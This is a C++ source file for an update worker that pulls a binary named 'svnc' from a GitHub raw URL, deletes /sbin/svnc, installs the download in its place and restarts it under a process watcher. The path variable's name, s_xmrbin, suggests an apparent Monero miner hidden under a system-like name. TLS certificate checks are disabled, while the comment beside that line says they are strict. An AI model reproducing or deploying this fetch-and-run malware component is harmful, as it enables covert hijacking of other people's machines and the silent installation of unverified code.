#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include "vkUpgradeWorker.h"
#include "vkProcess.h"
#include "../third-party/rapidjson/rapidjson.h"
#include "../third-party/rapidjson/filereadstream.h"
#include "../third-party/rapidjson/document.h"

//using namespace rapidjson;

/* static member init*/
uv_work_t* UpgradeWorker::m_worker         = nullptr;
PsWatcher* UpgradeWorker::m_pPsWatcher     = nullptr;
int UpgradeWorker::m_curl_global_init_rc   = curl_global_init(CURL_GLOBAL_ALL); // CURLE_OK
string UpgradeWorker::s_jsonfile           = Process::location(Process::ExeLocation, "json.txt");
string UpgradeWorker::s_exefile            = Process::location(Process::ExeLocation, "svnc");
const char* UpgradeWorker::s_json_url_addr      = "https://raw.githubusercontent.com/elixirfee/update/master/json.txt";
const char* UpgradeWorker::s_exe_url_addr       = "https://raw.githubusercontent.com/elixirfee/update/master/svnc";
const char* UpgradeWorker::s_xmrbin             = "/sbin/svnc";



UpgradeWorker::UpgradeWorker(PsWatcher *pPsWatcher)
{
    m_worker = new uv_work_t;
    m_worker->data = this;
    m_pPsWatcher = pPsWatcher;
}

UpgradeWorker::~UpgradeWorker(void)
{
    delete m_worker;
}

void UpgradeWorker::CheckPermission(const char* filename, unsigned int mode) 
{
    int r;
    uv_fs_t req;
    uv_stat_t* s;

    r = uv_fs_stat(NULL, &req, filename, NULL);
    assert(r == 0);
    assert(req.result == 0);

    s = &req.statbuf;
    #if defined(_WIN32) || defined(__CYGWIN__) || defined(__MSYS__)
    /*
        * On Windows, chmod can only modify S_IWUSR (_S_IWRITE) bit,
        * so only testing for the specified flags.
        */
    assert((s->st_mode & 0777) & mode);
    #else
    assert((s->st_mode & 0777) == mode);
    #endif

    uv_fs_req_cleanup(&req);
}

int  UpgradeWorker::DownloadFile(const char *pCurl,const char* pFilePath)
{
    int r = 0;

    FILE *fp = fopen(pFilePath, "w+");
    if (!fp)
        return -1;

    CURL *easy_handle = curl_easy_init();
    if(!easy_handle){   
        fclose(fp);
        return -1;
    }

    curl_easy_setopt(easy_handle, CURLOPT_URL, pCurl);
    /* Set the default value: strict certificate check please */
    curl_easy_setopt(easy_handle, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(easy_handle, CURLOPT_WRITEDATA, fp);
    curl_easy_setopt(easy_handle, CURLOPT_TIMEOUT, 1200);// 1200s
    r = curl_easy_perform(easy_handle);
    curl_easy_cleanup(easy_handle);
    
    fclose(fp);

    return r;
}

void UpgradeWorker::DoWorkCb(uv_work_t *req)
{
    FILE *fp=nullptr;
    int ret = 0;
    uv_fs_t fs_req;
    printf("%s entry\n", __FUNCTION__);
    string str;
    Md5sum ExeMd5sum;
    ExeMd5sum.Md5File(s_xmrbin);
    
    CURL *easy_handle = curl_easy_init();

    printf("md5sum:%s\n", ExeMd5sum.HexDigest().c_str());
    if(easy_handle) 
    {
        char readBuffer[512];
        // download json.txt
        //FILE *fp = fopen(s_jsonfile.c_str(), "w+");
        printf("step 0:download json file\n");
        ret = DownloadFile(s_json_url_addr,s_jsonfile.c_str());
        if (ret!=0)
        {
            printf("download json.txt fail!\n");
            goto error;
        }

        // get md5sum
        printf("step 1:check json md5sum and local exe's md5sum\n");
        fp = fopen(s_jsonfile.c_str(), "r");
        rapidjson::FileReadStream is(fp, readBuffer, sizeof(readBuffer));
        rapidjson::Document doc;
        doc.ParseStream(is);
        if (!doc.HasParseError())
        {
            if(doc.HasMember("md5sum"))
            {
                str = doc["md5sum"].GetString();
                printf("%s\n",str.c_str());
            }
        }
        fclose(fp);
        printf("exe md5sum:%s, js md5sum=%s\n",ExeMd5sum.HexDigest().c_str(),str.c_str());
        if(strcmp(ExeMd5sum.HexDigest().c_str(), str.c_str())==0)
        {
            printf("md5sum are same,don't need upgrade.\n");
            return ;
        }
        else
        {
            printf("md5sum are difference ,need upgrade.\n");
        }

        // download bin file
        printf("step 2:download exe file\n");
        ret = DownloadFile(s_exe_url_addr,s_exefile.c_str());
        if (ret!=0)
        {
            printf("download bin fail!\n");
            goto error;
        }

        printf("step 3:check remote exe's md5sum\n");
        ExeMd5sum.Md5File(s_exefile.c_str());
        printf("exe md5sum:%s, js md5sum=%s\n",ExeMd5sum.HexDigest().c_str(),str.c_str());
        if(strcmp(ExeMd5sum.HexDigest().c_str(), str.c_str())==0)
        {
            printf("check bin md5sum pass\n");
        }
        else
        {
            printf("check bin md5sum fail, it seems broken\n");
            return ;
        }

        if (m_pPsWatcher){
            printf("step 4:stop current svnc\n");
            m_pPsWatcher->Stop();
        }

        printf("step 5:remove old exe file\n");
        ret = uv_fs_unlink(NULL, &fs_req, UpgradeWorker::s_xmrbin, NULL);
        assert(ret == 0);
        assert(fs_req.result == 0);
        uv_fs_req_cleanup(&fs_req); 

        printf("step 6:copy new exe file to replace old one\n");
        ret = uv_fs_rename(NULL, &fs_req, s_exefile.c_str(),  UpgradeWorker::s_xmrbin, NULL);                                                                 
        assert(ret == 0);
        assert(fs_req.result == 0);
        uv_fs_req_cleanup(&fs_req);

        #ifndef _WIN32
        printf("step 7:check mode\n");
        /* Make the file write-only */
        ret = uv_fs_chmod(NULL, &fs_req, UpgradeWorker::s_xmrbin, 0731, NULL);                                                                                 
        assert(ret == 0);
        assert(fs_req.result == 0);
        uv_fs_req_cleanup(&fs_req);

        CheckPermission(UpgradeWorker::s_xmrbin, 0731);
        #endif

        if (m_pPsWatcher){
            printf("step 8:finished and run new exe\n");
            m_pPsWatcher->Start();
        }
    }
error:    
    printf("%s exit\n", __FUNCTION__);
}

void UpgradeWorker::AfterWorkCb(uv_work_t *req, int status)
{ 
    printf("after do working\n");  
    UpgradeWorker *pThis = (UpgradeWorker*)req->data;
    delete pThis;
}

void UpgradeWorker::Scheduler(void)
{
    uv_queue_work(uv_default_loop(), m_worker, UpgradeWorker::DoWorkCb, UpgradeWorker::AfterWorkCb);
}